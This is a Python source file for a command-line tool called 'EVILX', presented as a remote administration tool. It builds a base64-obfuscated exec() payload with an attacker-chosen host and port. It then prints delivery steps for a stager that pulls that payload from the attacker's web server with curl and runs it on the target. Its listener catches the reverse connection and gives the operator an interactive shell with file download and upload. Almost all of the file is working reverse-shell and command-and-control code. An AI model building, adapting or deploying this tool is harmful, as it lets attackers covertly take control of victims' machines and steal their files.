#!/usr/bin/env python3
from socket import socket , error , AF_INET , SOCK_STREAM , SOL_SOCKET , SO_REUSEADDR
from os import system , getcwd
from colorama import Fore
import base64
from subprocess import getoutput
import struct
from time import sleep

#colors 
R = Fore.LIGHTRED_EX
G = Fore.LIGHTGREEN_EX
B = Fore.LIGHTBLUE_EX
RES = Fore.RESET

#payload creator for create payloads 
class payload_creator():
	def create_payload(self,lhost,lport,cwd):
		try:
			self.lhost = lhost
			self.lport = lport
			self.shellcmd = f'curl http://{self.lhost}:8000/payload.py'
			self.stager_sample = "python3 -c $($(echo b64shellcommand | base64 -d))"
			with open('payload-samples/payload-sample01.py','r') as payload_sample:
				code = payload_sample.read()
				payload_sample.close()
			code = code.replace('lhost' , self.lhost).replace('lport' , str(self.lport))
			b64_code = base64.b64encode(code.encode('utf-8'))
			payload_code = f"""exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{b64_code.decode('utf-8')}')[0]))"""
			with open('payload.py','w') as payload:
				payload.write(payload_code)
				payload.close()
			print(f"\n	{RES}the payload was successfully created !\n	saved as {cwd}/payload.py ")
			
			print(f"\n note : you can deliver the payload and execute it just by folowing the steps bellow,\n	1-initiate a simple python web server : python3 -m http.server -d {cwd}\n	2-lunch this command into the target system :\n	 {self.stager_sample.replace('b64shellcommand',base64.b64encode(self.shellcmd.encode('utf-8')).decode('utf-8'))}")
		
		except Exception as e:
			print(f"{R} {str(e)}")


#listen for incoming connections
class listener():
	shell_is_active = False
	
	def listen(self,lhost,lport):
		try:
			self.server = socket(AF_INET , SOCK_STREAM)
			self.server.setsockopt(SOL_SOCKET , SO_REUSEADDR ,1)
			self.server.bind((lhost , int(lport)))
			self.server.listen(1)
			print(f"  [!] - listening for incoming connection ...!\n")
			self.client , self.address = self.server.accept()
			self.server.close()
#we call activate_shell function to set the shell_is_active to True
			self.activate_shell(True)
			
		except KeyboardInterrupt:
			self.server.close()
			system('clear')
			main()
		except Exception as e:
			print(f"{R} {str(e)}")
			back = input('\n press enter to back to the main menu ')
			system('clear')
			main()
#this function for set the shell_is_active value either  True or False
	def activate_shell(self , value):
		self.shell_is_active = value
	
	def send(self , data):
		pkt = struct.pack('>I' , len(data)) + data
		self.client.sendall(pkt)
	def recv(self):
		pktlen = self.recvall(4)
		if not pktlen: return ""
		pktlen = struct.unpack('>I' , pktlen)[0]
		return self.recvall(pktlen)
	def recvall(self , n):
		packet = b''
		while len(packet) < n:
			frame = self.client.recv(n - len(packet))
			if not frame:return None
			packet += frame
		return packet
	
	
	def shell(self):
			shell_help_menu = """
help menu:
exit				exit this session & go to the main menu 
cd	   			change the current working directory
download 	 download a file from the target machine     usage: download <file name>  <file path (where to save in your machine)>
upload 		  upload a file to the target machine     usage: upload <file name>  <file path (where to save into the target machine)>
clear 			  clear the current terminal
			
			"""
			
			try:
				user = self.recv().decode('utf-8')
				while self.shell_is_active:
					command = input(f"{G}{user}{R}@{G}{self.address[0]}${RES} ")
					if command.lower() == 'help':
						print(shell_help_menu)
					elif command.lower() == 'exit':
						self.send(command.encode('utf-8'))
						self.client.close()
						self.activate_shell(False)
						system('clear')
						main()
					elif command[:8].lower() == 'download':
						self.send(command.encode('utf-8'))
						try:
							content = self.recv()
							with open(command.split()[2] , 'wb') as file:
								file.write(content)
								file.close()
						except Exception as e:
							print(str(e))
					elif command[:6].lower() == 'upload':
						self.send(command.encode('utf-8'))
						try:
							with open(command.split()[1] ,'rb') as file:
								content = file.read()
								file.close()
							self.send(content)
						except Exception as e:
							print(str(e))
					else:
						self.send(command.encode('utf-8'))
						output = self.recv()
						print(output.decode('utf-8'))
			except KeyboardInterrupt:
				self.send(b'exit')
				self.activate_shell(False)
				self.client.close()
				print(f"{R}keyboard interrupt !")
				sleep(0.5)
				system('clear')
				main()
			except Exception as e:
				print(f"{R} {str(e)}")
				system('clear')
				main()
				
listener = listener()
payload_creator = payload_creator()

#main menu
def main():
	try:
		main_chois = input(f"""{G}

		╔═╗╦  ╦╦╦  ═╗ ╦
		║╣ ╚╗╔╝║║  ╔╩╦╝
		╚═╝ ╚╝ ╩╩═╝╩ ╚═                                                             
	  (Remote Administration Tool)
{RES}
		
  [1] --->  create a payload
  [2] --->  start listener 
  [3] --->  exit
      
      >>>{RES} """)
	except KeyboardInterrupt:
		exit()
		
	if main_chois == '1':
		try:
			system('clear')
			print(f"{G}	  [*] Payload creator {RES}")
			p_lhost = input(f"\n  [+] - lhost : ")
			p_lport = int(input(f"  [+] - lport : "))
			cwd = getoutput('pwd')
			payload_creator.create_payload(p_lhost,p_lport,cwd)
			
		except KeyboardInterrupt and ValueError:
			system('clear')
			main()
	
	elif main_chois == '2':
		try:
			system('clear')
			print(f"{G}	  [*] Listener {RES}")
			lhost = input(f"\n  [+] - lhost : ")
			lport = input(f"  [+] - lport : ")
			listener.listen(lhost,lport)
			if listener.shell_is_active:
				listener.shell()
		except KeyboardInterrupt:
			system('clear')
			main()
	
	elif main_chois == '3':
		exit()
	
	else:
		listener.activate_shell(False)
		system('clear')
		main()
main()
